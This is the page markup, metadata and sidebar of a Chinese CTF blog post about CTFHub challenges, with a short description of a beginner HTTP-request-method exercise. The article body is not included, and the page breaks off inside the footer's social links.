
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>CTFHub系列 - hybcx's blog</title>

  
    <meta name="description" content="0x00 Web Web前置技能 HTTP协议-请求方式 题目描述：HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。  提示:如果你得到“HTTP方法不允许”错误，你应该请求index.php。 这里不知道请求的含义，还是看了wp才明白的。。。先说结果，这里说是http请求方法是可以自定义的，那题目让我们使用CTFHUB方法来请求index.ph">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFHub系列">
<meta property="og:url" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x00 Web Web前置技能 HTTP协议-请求方式 题目描述：HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。  提示:如果你得到“HTTP方法不允许”错误，你应该请求index.php。 这里不知道请求的含义，还是看了wp才明白的。。。先说结果，这里说是http请求方法是可以自定义的，那题目让我们使用CTFHUB方法来请求index.ph">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212203559503.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212204347958.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212204458732.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212211241224.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212211253414.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212211347849.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212211505277.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212211604661.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212211631030.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212212837452.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212212854575.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212212916214.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212213011544.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212213743959.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212213405884.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212213556193.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212213606302.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212213834114.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212214205734.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212214216206.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212214932810.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212214947406.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212215021863.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212215213639.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212215549179.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212215622650.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212215728521.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212220039409.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212220509792.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212221303875.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212221320761.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218175448914.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218175524781.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218175642115.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218175815354.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218175827853.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218180000146.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218200046002.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218200112144.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218200131951.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218200218024.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218201612501.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218203818976.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218203917706.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218203932889.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218204540647.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218204620280.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218204733153.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218204923615.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218210138379.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231218210103912.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219174121497.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219174102330.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219174219464.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219174300468.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219174446930.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219174838992.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219174946298.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219175106573.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219175252521.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219175231504.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219180027132.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219181316085.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219191336883.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219191415075.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219191527988.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219191623662.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219191716003.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219192046271.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219192208158.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219193020704.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219193137036.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219195035851.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231219195214490.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221155028167.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221155111294.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221155107898.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221155625464.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221155656804.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221155727242.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221155812545.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221160549747.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221160515089.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221161953167.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221161746779.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221163932085.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221163853220.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221163840285.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231221165025048.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222140155631.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222140558101.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222140941551.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222141056675.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222141700371.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222141731681.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222141816824.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222142002557.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222142110464.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222142332612.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222142435043.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222143107989.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222143014229.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222143243099.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222143453476.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222143857725.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222144054449.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222144135376.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222144329592.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222144917742.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222145527575.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222145640981.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222145935363.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222150603576.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222151109422.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222151739546.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222152026089.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222152236877.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222154059410.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222154113594.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222154140256.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222154840357.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222160446048.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222161315946.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222161449988.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222162419632.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222162442551.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222162505132.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222162521166.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222163823929.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222170512279.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222194054670.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222203532162.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222203852572.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222203848369.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222204342856.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222210517783.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222210656011.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222210609376.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222210459609.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231222210941100.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20240107193125161.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20240107193234698.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20240107193524657.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20240107193721630.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20240107193756362.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20240107194931163.png">
<meta property="og:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20240107200717155.png">
<meta property="article:published_time" content="2023-12-12T12:32:20.972Z">
<meta property="article:modified_time" content="2024-03-03T07:43:46.959Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="CTF赛事">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hybcx.xyz/2023/12/12/ctfhub-xi-lie/image-20231212203559503.png">
  
  
  
  <meta name="keywords" content="CTF赛事">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/05/26/flask-nei-cun-ma-xue-xi/"><span class="title">Flask内存马学习</span></a><a class="item title" href="/2024/05/12/h-nctf2024/"><span class="title">H&NCTF2024</span></a><a class="item title" href="/2024/05/21/ciscn-2024wp/"><span class="title">CISCN-2024Wp</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/05/05/tmh-huan-chong-qu-yi-chu/"><span class="title">TMH-缓冲区溢出学习</span></a><a class="item title" href="/2024/05/05/di-shi-wu-jie-quan-qian-bei-wp/"><span class="title">第十五届圈钱杯wp</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" 